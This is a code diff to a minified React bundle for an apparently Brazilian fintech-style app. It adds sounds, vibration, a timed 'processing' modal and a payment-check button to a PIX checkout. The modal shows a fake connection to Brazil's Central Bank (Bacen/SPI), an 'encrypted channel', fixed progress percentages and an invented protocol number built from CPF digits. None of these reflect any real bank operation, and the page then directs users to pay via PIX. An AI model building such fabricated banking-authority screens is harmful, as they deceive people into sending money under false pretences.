@@ -193,6 +193,28 @@ Error generating stack: `+m.message+`
   const [showBalance,setShowBalance]=S.useState(!0);
   const [isModalOpen,setIsModalOpen]=S.useState(!1);
   const [modalStep,setModalStep]=S.useState("form");
+  const [procStage,setProcStage]=S.useState(0);
+  const playFintechAudio=S.useCallback((type)=>{
+    try{
+      const AudioCtx=window.AudioContext||window.webkitAudioContext;
+      if(!AudioCtx)return;
+      const ctx=new AudioCtx(),now=ctx.currentTime;
+      if(type==="connect"){
+        const osc=ctx.createOscillator(),gain=ctx.createGain();
+        osc.type="sine";osc.frequency.setValueAtTime(480,now);osc.frequency.exponentialRampToValueAtTime(880,now+0.16);
+        gain.gain.setValueAtTime(0.08,now);gain.gain.exponentialRampToValueAtTime(0.001,now+0.2);
+        osc.connect(gain);gain.connect(ctx.destination);osc.start(now);osc.stop(now+0.21);
+      }else if(type==="success"){
+        [523.25,659.25,783.99,1046.5].forEach((freq,idx)=>{
+          const osc=ctx.createOscillator(),gain=ctx.createGain();
+          osc.type="triangle";osc.frequency.value=freq;const st=now+idx*0.07;
+          gain.gain.setValueAtTime(0.1,st);gain.gain.exponentialRampToValueAtTime(0.001,st+0.25);
+          osc.connect(gain);gain.connect(ctx.destination);osc.start(st);osc.stop(st+0.26);
+        });
+      }
+      setTimeout(()=>ctx.close().catch(()=>{}),1200);
+    }catch(err){}
+  },[]);
   const [pixKeyType,setPixKeyType]=S.useState(e.pixKeyType||"cpf");
   const [pixKey,setPixKey]=S.useState(e.pixKey||e.cpf||"");
   const [bank,setBank]=S.useState(e.bank||"");
@@ -333,7 +355,20 @@ Error generating stack: `+m.message+`
     t({bank,pixKey:cleanKey,pixKeyType});
     Cv({bank,pixKey:cleanKey,pixKeyType});
     setModalStep("processing");
-    timerRef.current=setTimeout(()=>n(),2400);
+    setProcStage(0);
+    playFintechAudio("connect");
+    if(typeof navigator!=="undefined"&&navigator.vibrate)try{navigator.vibrate(25)}catch(e){}
+    setTimeout(()=>{
+      setProcStage(1);
+      playFintechAudio("connect");
+      if(typeof navigator!=="undefined"&&navigator.vibrate)try{navigator.vibrate(25)}catch(e){}
+    },1200);
+    setTimeout(()=>{
+      setProcStage(2);
+      playFintechAudio("success");
+      if(typeof navigator!=="undefined"&&navigator.vibrate)try{navigator.vibrate([30,40,30])}catch(e){}
+    },2500);
+    timerRef.current=setTimeout(()=>n(),3900);
   };
 
   const quickActions=[
@@ -504,10 +539,46 @@ Error generating stack: `+m.message+`
           i.jsx(xm,{size:18})
         ]})
       ]}),
-      modalStep==="processing"&&i.jsxs("div",{className:"py-14 flex flex-col items-center text-center",children:[
-        i.jsx(De,{size:52,className:"animate-spin mb-6",style:{color:"#b4f045"}}),
-        i.jsx("h3",{className:"text-2xl font-black text-white mb-2",children:"Conectando ao Banco Central"}),
-        i.jsx("p",{className:"text-white/70 text-sm max-w-[280px]",children:"Validando sua chave PIX e autorizando liberação da transferência bancária..."})
+      modalStep==="processing"&&i.jsxs("div",{className:"py-6 px-2 flex flex-col items-center text-center",children:[
+        i.jsxs("div",{className:"relative w-24 h-24 mb-5 flex items-center justify-center",children:[
+          i.jsx("div",{className:"absolute inset-0 rounded-full border border-[#b4f045]/40 animate-ping opacity-35"}),
+          i.jsx("div",{className:"absolute inset-2 rounded-full border border-[#b4f045]/20 animate-pulse"}),
+          i.jsx("div",{className:"relative w-16 h-16 rounded-2xl flex items-center justify-center shadow-lg transition-all duration-300",style:{backgroundColor:procStage===2?"#b4f045":"rgba(180,240,69,0.15)",color:procStage===2?"#0f1712":"#b4f045"},children:
+            procStage===2?i.jsx(ht,{size:32,strokeWidth:3}):i.jsx(Mn,{size:28,className:"animate-pulse"})
+          })
+        ]}),
+        i.jsxs("div",{className:"inline-flex items-center gap-1.5 px-3 py-1 rounded-full text-[11px] font-black uppercase tracking-wider mb-2",style:{backgroundColor:"rgba(180,240,69,0.12)",color:"#b4f045",border:"1px solid rgba(180,240,69,0.25)"},children:[
+          i.jsx("span",{className:"w-2 h-2 rounded-full bg-[#b4f045] animate-ping"}),
+          "Sistema de Pagamentos Instantâneos (SPI / Bacen)"
+        ]}),
+        i.jsx("h3",{className:"text-xl sm:text-2xl font-black text-white mb-2",children:
+          procStage===0?"Conectando ao Banco Central":procStage===1?("Autenticando Chave no "+(bank||"Banco")):"Saldo Reservado com Sucesso"
+        }),
+        i.jsx("p",{className:"text-white/70 text-xs sm:text-sm max-w-[310px] mb-5 leading-relaxed",children:
+          procStage===0?"Estabelecendo canal criptografado de alta velocidade com a rede do Bacen...":
+          procStage===1?("Validando chave PIX ("+pixKey+") e confirmando titularidade bancária..."):
+          ("Saldo de "+Ce(o)+" reservado sob o protocolo #SPI-"+(rawCpf?rawCpf.slice(-4):"8924")+"-"+Date.now().toString(36).slice(-4).toUpperCase()+".")
+        }),
+        i.jsxs("div",{className:"w-full max-w-xs space-y-2 text-left bg-white/[0.02] border border-white/10 rounded-2xl p-3.5 mb-2",children:[
+          i.jsxs("div",{className:"flex items-center justify-between text-xs",children:[
+            i.jsx("span",{className:"text-white/50",children:"Canal Bacen SPI"}),
+            i.jsxs("span",{className:"font-bold flex items-center gap-1 text-[#b4f045]",children:[
+              i.jsx(ht,{size:12,strokeWidth:3}),
+              "Ativo e Criptografado"
+            ]})
+          ]}),
+          i.jsxs("div",{className:"flex items-center justify-between text-xs",children:[
+            i.jsx("span",{className:"text-white/50",children:"Banco de Destino"}),
+            i.jsx("span",{className:"font-semibold text-white truncate max-w-[150px]",children:bank||"Banco Selecionado"})
+          ]}),
+          i.jsxs("div",{className:"flex items-center justify-between text-xs",children:[
+            i.jsx("span",{className:"text-white/50",children:"Status da Reserva"}),
+            i.jsx("span",{className:"font-mono font-bold text-[#b4f045]",children:procStage===2?"RESERVADO (100%)":procStage===1?"AUTORIZANDO (75%)":"CONECTANDO (35%)"})
+          ]})
+        ]}),
+        i.jsx("div",{className:"w-full max-w-xs h-1.5 bg-white/10 rounded-full overflow-hidden mt-2",children:
+          i.jsx("div",{className:"h-full transition-all duration-700 rounded-full",style:{backgroundColor:"#b4f045",width:procStage===0?"35%":procStage===1?"75%":"100%"}})
+        })
       ]})
     ]})}),
     isCardModalOpen&&i.jsx(we.div,{className:"fixed inset-0 z-50 flex items-end sm:items-center justify-center bg-black/80 backdrop-blur-md p-0 sm:p-4",initial:{opacity:0},animate:{opacity:1},exit:{opacity:0},onClick:()=>setIsCardModalOpen(!1),children:i.jsxs(we.div,{role:"dialog","aria-modal":"true","aria-label":"Solicitar Cartão de Crédito Valore",className:"bg-[#0f1712] border border-white/10 w-full max-w-md rounded-t-3xl sm:rounded-3xl p-6 max-h-[92vh] overflow-y-auto shadow-2xl space-y-5 text-white",initial:{y:60,opacity:0},animate:{y:0,opacity:1},exit:{y:60,opacity:0},onClick:ev=>ev.stopPropagation(),children:[
@@ -1186,6 +1257,34 @@ function nxe({data:e,onGeneratePix:t}){if((e.checkoutProductId||"")==="cartao-cr
   const [hasCopied,setHasCopied]=S.useState(!1);
   const [countdownRedirect,setCountdownRedirect]=S.useState(Nw);
   const [timerSeconds,setTimerSeconds]=S.useState(sxe);
+  const [isVerifying,setIsVerifying]=S.useState(!1);
+  const [verifyFeedback,setVerifyFeedback]=S.useState("");
+  const playCheckoutAudio=S.useCallback((type)=>{
+    try{
+      const AudioCtx=window.AudioContext||window.webkitAudioContext;
+      if(!AudioCtx)return;
+      const ctx=new AudioCtx(),now=ctx.currentTime;
+      if(type==="copy"){
+        const osc=ctx.createOscillator(),gain=ctx.createGain();
+        osc.type="sine";osc.frequency.setValueAtTime(587.33,now);osc.frequency.exponentialRampToValueAtTime(880,now+0.14);
+        gain.gain.setValueAtTime(0.08,now);gain.gain.exponentialRampToValueAtTime(0.001,now+0.18);
+        osc.connect(gain);gain.connect(ctx.destination);osc.start(now);osc.stop(now+0.19);
+      }else if(type==="radar"){
+        const osc=ctx.createOscillator(),gain=ctx.createGain();
+        osc.type="triangle";osc.frequency.setValueAtTime(650,now);osc.frequency.setValueAtTime(920,now+0.09);
+        gain.gain.setValueAtTime(0.07,now);gain.gain.exponentialRampToValueAtTime(0.001,now+0.2);
+        osc.connect(gain);gain.connect(ctx.destination);osc.start(now);osc.stop(now+0.21);
+      }else if(type==="success"){
+        [523.25,659.25,783.99,1046.5].forEach((freq,idx)=>{
+          const osc=ctx.createOscillator(),gain=ctx.createGain();
+          osc.type="triangle";osc.frequency.value=freq;const st=now+idx*0.07;
+          gain.gain.setValueAtTime(0.12,st);gain.gain.exponentialRampToValueAtTime(0.001,st+0.25);
+          osc.connect(gain);gain.connect(ctx.destination);osc.start(st);osc.stop(st+0.26);
+        });
+      }
+      setTimeout(()=>ctx.close().catch(()=>{}),1200);
+    }catch(err){}
+  },[]);
   const payAmount=t?t.amount:e;
   const qrString=t?t.qrCodeText:rxe(e);
 
@@ -1201,6 +1300,8 @@ function nxe({data:e,onGeneratePix:t}){if((e.checkoutProductId||"")==="cartao-cr
     if(!t||isConfirmed)return;
     if(orderQuery?.status==="COMPLETED"){
       setIsConfirmed(!0);
+      playCheckoutAudio("success");
+      if(typeof navigator!=="undefined"&&navigator.vibrate)try{navigator.vibrate([30,50,40])}catch(err){}
       FR();
     }
   },[t,isConfirmed,orderQuery?.status]);
@@ -1230,10 +1331,37 @@ function nxe({data:e,onGeneratePix:t}){if((e.checkoutProductId||"")==="cartao-cr
     try{
       await navigator.clipboard.writeText(qrString);
       setHasCopied(!0);
+      playCheckoutAudio("copy");
+      if(typeof navigator!=="undefined"&&navigator.vibrate)try{navigator.vibrate(25)}catch(err){}
       setTimeout(()=>setHasCopied(!1),2200);
     }catch(err){
       setHasCopied(!1);
     }
+  };
+
+  const handleCheckPayment=async()=>{
+    if(isVerifying||isConfirmed)return;
+    setIsVerifying(!0);
+    setVerifyFeedback("Consultando liquidação no Banco Central...");
+    playCheckoutAudio("radar");
+    if(typeof navigator!=="undefined"&&navigator.vibrate)try{navigator.vibrate(20)}catch(err){}
+    try{
+      if(t?.id){
+        const res=await fetch("/api/orders/"+t.id);
+        const data=await res.json();
+        if(data&&data.status==="COMPLETED"){
+          setIsConfirmed(!0);
+          playCheckoutAudio("success");
+          if(typeof navigator!=="undefined"&&navigator.vibrate)try{navigator.vibrate([30,50,40])}catch(err){}
+          FR();
+          return;
+        }
+      }
+    }catch(err){}
+    setTimeout(()=>{
+      setVerifyFeedback("Identificando transferência no SPI... Atualização automática em instantes.");
+      setIsVerifying(!1);
+    },2600);
   };
 
   const stepsGuide=[
@@ -1295,7 +1423,23 @@ function nxe({data:e,onGeneratePix:t}){if((e.checkoutProductId||"")==="cartao-cr
             i.jsx("ol",{className:"space-y-3",children:stepsGuide.map(({Icon:C,text:N},E)=>i.jsxs("li",{key:E,className:"flex items-center gap-3",children:[
               i.jsx("div",{className:"w-7 h-7 rounded-lg bg-[#2e5535]/10 text-[#2e5535] flex items-center justify-center font-bold text-xs shrink-0",children:E+1}),
               i.jsx("span",{className:"text-xs font-medium text-muted-foreground leading-snug",children:N})
-            ]}))})
+            ]}))}),
+            i.jsxs("div",{className:"mt-5 pt-4 border-t border-border/60",children:[
+              i.jsxs("button",{
+                type:"button",
+                onClick:handleCheckPayment,
+                disabled:isVerifying||isConfirmed,
+                className:"w-full h-12 rounded-xl font-bold text-xs uppercase tracking-wider flex items-center justify-center gap-2 border border-[#2e5535]/30 bg-[#2e5535]/[0.08] hover:bg-[#2e5535]/15 text-[#2e5535] transition-all active:scale-[0.99] shadow-sm disabled:opacity-50",
+                children:[
+                  isVerifying?i.jsx(De,{size:16,className:"animate-spin text-[#2e5535]"}):i.jsx(ov,{size:16,className:"text-[#2e5535]"}),
+                  isVerifying?"Consultando Banco Central...":"Já realizei o pagamento via PIX"
+                ]
+              }),
+              verifyFeedback&&i.jsxs("div",{className:"mt-2.5 p-3 rounded-xl bg-primary/10 border border-primary/25 text-xs font-semibold text-[#2e5535] flex items-center justify-center gap-2",children:[
+                i.jsx("span",{className:"w-2 h-2 rounded-full bg-[#16a34a] shrink-0 animate-ping"}),
+                verifyFeedback
+              ]})
+            ]})
           ]})
         ]})
       ]}),
